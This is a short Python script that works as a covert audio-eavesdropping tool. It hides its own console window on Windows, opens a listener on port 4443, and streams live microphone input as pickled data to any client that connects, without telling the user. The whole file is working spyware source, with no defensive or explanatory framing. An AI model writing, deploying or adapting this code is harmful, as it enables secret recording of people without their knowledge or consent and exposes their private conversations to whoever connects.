import socket, pickle, sounddevice as sd
from time import sleep

## pip install pywin32 
import win32gui, win32con

#hide cmd console when executing
hide = win32gui.GetForegroundWindow()
win32gui.ShowWindow(hide , win32con.SW_HIDE)

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind((socket.gethostname(), 4443))
sock.listen(5)

clientsocket, clientaddress = None, None

def callback(indata, frames, time, status):
	msg = pickle.dumps(indata)
	clientsocket.send(msg)


while True:
	clientsocket, clientaddress = sock.accept()

	try:
		#blocksize=336
		with sd.InputStream(blocksize=336, callback=callback, channels=1):
			input()
	except Exception as e:
		print(e)

	clientsocket.close()